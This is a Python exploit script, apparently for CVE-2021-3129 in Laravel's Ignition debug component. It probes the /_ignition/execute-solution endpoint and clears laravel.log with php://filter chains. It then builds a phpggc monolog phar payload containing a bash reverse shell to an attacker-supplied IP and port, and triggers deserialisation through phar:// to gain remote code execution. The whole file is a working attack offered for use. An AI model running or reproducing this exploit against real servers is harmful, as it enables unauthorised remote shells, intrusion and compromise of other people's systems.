import requests
import sys
import base64
import os
from requests.packages.urllib3.exceptions import InsecureRequestWarning


if __name__ == '__main__':
    print(
"""
_____________   ______________         _______________   ________  ____          ________  ____________  ________ 
\_   ___ \   \ /   |_   _____/         \_____  \   _  \  \_____  \/_   |         \_____  \/_   \_____  \/   __   \\
/    \  \/\   Y   / |    __)_   ______  /  ____/  /_\  \  /  ____/ |   |  ______   _(__  < |   |/  ____/\____    /
\     \____\     /  |        \ /_____/ /       \  \_/   \/       \ |   | /_____/  /       \|   /       \   /    / 
 \______  / \___/  /_______  /         \_______ \_____  /\_______ \|___|         /______  /|___\_______ \ /____/  by ccdragon
        \/                 \/                  \/     \/         \/                     \/             \/         
"""
    )
    # 防止奇怪问题
    if(sys.argv[1][-1]=='/'):
        sys.argv[1]=sys.argv[1][:-1]
    # 关闭ssl warning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0","Content-Type":"application/json"}
    
    # 探测
    poc_payload={"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"username","viewFile":[1]}}
    poc=requests.post(str(sys.argv[1])+"/_ignition/execute-solution",headers=headers,json=poc_payload,verify = False)
    if("isSafePath" in poc.text):
        print("Patched!")
        exit()

    # 用法 python exp.py url vps_ip vps_port
    print(sys.argv)
    clear_log_payload={"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"username","viewFile":"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"}}
    
    # 先清空log(必须要2次)
    a=requests.post(str(sys.argv[1])+"/_ignition/execute-solution",headers=headers,json=clear_log_payload,verify = False)
    a=requests.post(str(sys.argv[1])+"/_ignition/execute-solution",headers=headers,json=clear_log_payload,verify = False)
    if(a.status_code==200):
        print("log is cleared!")
    # 生成并且尝试payload

    os.system("php -d 'phar.readonly=0' ./phpggc -p phar -o ./monolog1.phar monolog/rce1 system 'bash -c \"bash -i >& /dev/tcp/"+sys.argv[2]+"/"+sys.argv[3]+" 0>&1\"'")


    with open("monolog1.phar","rb") as f:
        a=f.read()
        a = base64.b64encode(a)
    b=""
    for i in a:
        b+="=%x=00" % i
    payload="A"*16+b.upper() #必须大写,添加A作为padding

    for i in range(4):
        print("sending payload no."+str(i))
        test_payload=payload[i:]
        # print(test_payload)
        attack_payload={"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"username","viewFile":test_payload}}
        a=requests.post(str(sys.argv[1])+"/_ignition/execute-solution",headers=headers,json=attack_payload,verify = False)
        
        attack_payload2={"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"username","viewFile":"php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"}}
        a=requests.post(str(sys.argv[1])+"/_ignition/execute-solution",headers=headers,json=attack_payload2,verify = False)

        attack_payload3={"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"username","viewFile":"phar://../storage/logs/laravel.log"}}
        a=requests.post(str(sys.argv[1])+"/_ignition/execute-solution",headers=headers,json=attack_payload3,verify = False)
        if("cannot be empty" in a.text):
            print("Success,check reverse shell")
            exit()
    print("Over...")

    